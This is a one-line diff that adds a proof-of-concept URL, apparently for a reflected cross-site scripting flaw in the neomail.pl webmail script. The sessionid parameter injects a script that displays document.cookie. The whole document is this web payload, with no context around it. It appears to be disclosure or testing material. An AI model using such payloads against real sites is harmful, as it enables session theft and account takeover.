@@ -1,0 +1,1 @@
+http://www.example.com:2095/user+site.com/neomail.pl?sessionid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
